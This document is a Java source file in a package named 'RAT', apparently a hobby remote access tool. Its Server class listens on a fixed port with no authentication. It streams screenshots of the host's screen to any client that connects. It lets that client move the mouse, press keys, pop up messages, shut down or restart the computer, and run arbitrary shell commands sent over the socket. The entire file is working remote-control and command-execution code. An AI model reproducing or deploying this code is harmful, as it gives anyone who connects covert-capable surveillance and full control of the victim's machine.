package RAT;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.net.ServerSocket;
import java.net.Socket;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

/*
 * @Date: Unknown
 * @Author: Liam Gardner
 * @Purpose: this is what you connect to and control
 */
public class Server {
    static ServerSocket socket;
    static int x;
    static int y;
    public Server(int port, boolean custom) {
        if (custom) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Robot rob = new Robot();
                        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
                        socket = new ServerSocket(port);
                        System.out.println(socket.getInetAddress());
                        while (true) {
                            try {
                                Socket so = socket.accept();
                                BufferedImage img = rob.createScreenCapture(new Rectangle(0, 0, (int) d.getWidth(), (int) d.getHeight()));
                                Graphics g = img.getGraphics();
                                g.setColor(Color.RED);
                                g.drawImage(new ImageIcon(getClass().getResource("mouse.png")).getImage(), MouseInfo.getPointerInfo().getLocation().x, MouseInfo.getPointerInfo().getLocation().y, null);
                                //g.fillRect(MouseInfo.getPointerInfo().getLocation().x, MouseInfo.getPointerInfo().getLocation().y, 30, 30);
                                ByteArrayOutputStream ous = new ByteArrayOutputStream();

                                ImageIO.write(img, "png", ous);
                                so.getOutputStream().write(ous.toByteArray());
                                try {
                                    DataInputStream in = new DataInputStream(so.getInputStream());
                                    byte[] msg = new byte[1000];
                                    boolean end = false;
                                    String messageString = "";
                                    int bytesRead;
                                    while (!end) {
                                        bytesRead = in.read(msg);
                                        messageString += new String(msg, 0, bytesRead);
                                        try {
                                            String[] alpha = messageString.split("\n");
                                            if (alpha.length == 5){
                                                System.out.println(alpha[0]+" "+alpha[1]+" "+alpha[2]+" "+alpha[3]);
                                                if (!alpha[0].equals("-1")){
                                                    new Thread(new Runnable() {
                                                        @SuppressWarnings("unused")
														@Override
                                                        public void run() {
                                                        	if (alpha[0].contains("MSGBOX")) {
                                                        		JOptionPane.showMessageDialog(null, alpha[0].substring(8));
                                                        	}else if (alpha[0].contains("CMD")) {
                                                        		if (alpha[0].contains("SHUTDOWN")) {
                                                        			JOptionPane.showMessageDialog(null, "Shutting down computer");
                                                        			Runtime rt = Runtime.getRuntime();
                                                        			try {                                                        				
                                                        				Process pr = rt.exec("shutdown /p");
                                                        			}catch (Exception exce) {
                                                        				JOptionPane.showMessageDialog(null, "Error");
                                                        			}
                                                        		}else if (alpha[0].contains("RESTART")) {
                                                        			JOptionPane.showMessageDialog(null, "Restarting Comptuer");
                                                        			Runtime rt = Runtime.getRuntime();
                                                        			try {
                                                        				Process pr = rt.exec("shutdown /r");
                                                        			}catch (Exception exce) {
                                                        				JOptionPane.showMessageDialog(null, "Error");
                                                        			}
                                                        		}else {
                                                        			try {
                                                        				Runtime rt = Runtime.getRuntime();
                                                        				Process pr = rt.exec(alpha[0].substring(5));
                                                        			}catch (Exception exce) {
                                                        				JOptionPane.showMessageDialog(null, "Error");
                                                        			}
                                                        		}
                                                        	}
                                                        }
                                                    }).start();
                                                }
                                                new Thread(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        if (!alpha[1].equals("-1") && !alpha[2].equals("-1")) {
                                                            x = Integer.parseInt(alpha[1]);
                                                            y = Integer.parseInt(alpha[2]);
                                                        }
                                                        rob.mouseMove(x,y);
                                                    }
                                                }).start();
                                                new Thread(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        int latest = -1;
                                                        if (alpha[3].equals("1")){
                                                            rob.mousePress(MouseEvent.BUTTON1_MASK);
                                                            rob.mouseRelease(MouseEvent.BUTTON1_MASK);
                                                        }else if (alpha[3].equals("2")){
                                                            rob.mousePress(MouseEvent.BUTTON2_MASK);
                                                            rob.mouseRelease(MouseEvent.BUTTON2_MASK);
                                                        }else if (alpha[3].equals("3")){
                                                            rob.mousePress(MouseEvent.BUTTON3_MASK);
                                                            rob.mouseRelease(MouseEvent.BUTTON3_MASK);
                                                        }else if (alpha[3].equals("4")){
                                                            rob.mousePress(MouseEvent.BUTTON1_MASK);
                                                            latest = MouseEvent.BUTTON1_MASK;
                                                        }else if (alpha[3].equals("5")){
                                                            rob.mousePress(MouseEvent.BUTTON2_MASK);
                                                            latest = MouseEvent.BUTTON2_MASK;
                                                        }else if (alpha[3].equals("6")){
                                                            rob.mousePress(MouseEvent.BUTTON3_MASK);
                                                            latest = MouseEvent.BUTTON3_MASK;
                                                        }else if (alpha[3].equals("-1") && latest != -1){
                                                            rob.mouseRelease(latest);
                                                            latest = -1;
                                                        }else if (alpha[3].equals("7")){
                                                            rob.mouseWheel(-3);
                                                        }else if (alpha[3].equals("8")){
                                                            rob.mouseWheel(3);
                                                        }
                                                    }
                                                }).start();
                                                if (!alpha[4].equals("-1")){
                                                    if (alpha[4].contains("S")){
                                                        rob.keyPress(KeyEvent.VK_SHIFT);
                                                        rob.keyPress(Integer.parseInt(alpha[4].substring(1)));
                                                        rob.keyRelease(Integer.parseInt(alpha[4].substring(1)));
                                                        rob.keyRelease(KeyEvent.VK_SHIFT);
                                                    }else {
                                                        rob.keyPress(Integer.parseInt(alpha[4]));
                                                        rob.keyRelease(Integer.parseInt(alpha[4]));
                                                    }
                                                }
                                            }
                                        }catch (Exception ex1){
                                            System.out.println();
                                        }
                                            if (messageString.split("\n").length == 4){
                                            end = false;
                                        }
                                    }
                                } catch (Exception ex2) {
                                    continue;
                                }
                                try {
                                    Thread.sleep(10);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    continue;
                                }
                            } catch (Exception ex1) {
                                ex1.printStackTrace();
                                continue;
                            }
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                        //JOptionPane.showMessageDialog(null, ex);
                    }
                }
            }).start();
        } else {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Robot rob = new Robot();
                        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
                        while (true) {
                            ServerSocket sock = new ServerSocket(port);
                            Socket so = sock.accept();
                            BufferedImage img = rob.createScreenCapture(new Rectangle(0, 0, (int) d.getWidth(), (int) d.getHeight()));

                            ByteArrayOutputStream ous = new ByteArrayOutputStream();
                            ImageIO.write(img, "png", ous);
                            so.getOutputStream().write(ous.toByteArray());
                            sock.close();
                            try {
                                Thread.sleep(10);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                        JOptionPane.showMessageDialog(null, ex);
                    }
                }
            }).start();
        }
    }

    public static void main(String[] args) {
        new Server(23610, true);
    }
}
